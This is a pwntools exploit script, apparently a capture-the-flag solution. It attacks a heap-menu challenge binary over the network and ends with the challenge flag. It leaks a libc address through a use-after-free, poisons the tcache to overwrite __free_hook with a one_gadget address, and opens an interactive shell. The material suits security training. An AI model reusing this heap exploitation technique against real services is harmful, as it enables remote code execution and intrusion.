from pwn import *

p = remote("gold.b01le.rs", 4001)
# p = process("./chal")

def alloc(index, size):
    p.sendlineafter(b'-----Resize----\n', b'1')
    p.sendlineafter(b'Where? ', str(index).encode())
    p.sendlineafter(b'size? ', str(size).encode())
def free(index):
    p.sendlineafter(b'-----Resize----\n', b'2')
    p.sendlineafter(b'Where? ', str(index).encode())
def view(index):
    p.sendlineafter(b'-----Resize----\n', b'3')
    p.sendlineafter(b'Where? ', str(index).encode())
    return p.recvuntil(b'-----Options---', drop=True)[:-1]
def edit(index, size, data):
    p.sendlineafter(b'-----Resize----\n', b'4')
    p.sendlineafter(b'Where? ', str(index).encode())
    p.sendlineafter(b'size? ', str(size).encode())
    p.send(data)
def exit_():
    p.sendlineafter(b'-----Resize----\n', b'5')
def resize(index, size):
    p.sendlineafter(b'-----Resize----\n', b'6')
    p.sendlineafter(b'Where? ', str(index).encode())
    p.sendlineafter(b'size? ', str(size).encode())

alloc(0, 0x420)
alloc(1, 0x10)
free(0)
libc_base = u64(view(0).ljust(8, b'\0')) - 0x3afca0

free_hook  = libc_base + 0x3b18e8
one_gadget = libc_base + 0xdeec2

log.info(f"libc base = {hex(libc_base)}")
log.info(f"free hook = {hex(free_hook)}")

alloc(0, 0x20)
alloc(1, 0x20)
free(1)
free(0)
edit(0, 0x08, p64(free_hook))
alloc(0, 0x20)
alloc(1, 0x20)
edit(1, 0x08, p64(one_gadget))

alloc(0, 0x30)
free(0)

p.interactive()

# bctf{j33z_1_d1dn7_kn0w_h34p_1z_s0_easy}
